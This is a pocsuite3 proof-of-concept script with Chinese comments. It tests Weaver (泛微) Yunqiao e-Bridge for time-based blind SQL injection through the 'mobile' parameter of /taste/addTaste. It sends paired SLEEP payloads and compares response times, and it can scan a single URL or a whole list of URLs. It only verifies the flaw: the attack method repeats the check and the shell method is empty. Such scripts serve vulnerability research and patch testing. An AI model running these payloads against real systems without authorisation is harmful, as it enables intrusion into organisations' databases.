'''
Date: 2023-12-14 16:58:23
LastEditTime: 2023-12-14 17:17:30
FilePath: \泛微OA\泛微-云桥e-Bridge_taste_addTaste_mobile_sql注入.py
Description: 

Copyright (c) 2023 by ${git_name_email}, All Rights Reserved. 
'''
from collections import OrderedDict
import urllib.parse
import re,random
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '20231213'  #漏洞公开的时间,不知道就写今天
    createDate = '20231213'  # 编写 PoC 的日期
    updateDate = '20231213'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '泛微-云桥e-Bridge_taste_addTaste_mobile_sql注入'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        path_true = "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1' AND (SELECT 8094 FROM (SELECT(SLEEP(3-(IF(1=1,0,2)))))mKjk) OR 'KQZm'='REcX"
        path_false = "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1' AND (SELECT 8094 FROM (SELECT(SLEEP(3-(IF(1=2,0,2)))))mKjk) OR 'KQZm'='REcX"
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
        }
        try:
            resp_3s = requests.get(url=self.url + path_true, headers=headers, verify=False, timeout=10)
            resp_1s = requests.get(url=self.url + path_false, headers=headers, verify=False, timeout=10)
            if (resp_3s.status_code == 200 and resp_3s.elapsed.seconds >= 3) and (resp_1s.status_code == 200 and resp_1s.elapsed.seconds <= 2 ):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = self.url + path_true
        except Exception as e:
            return
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)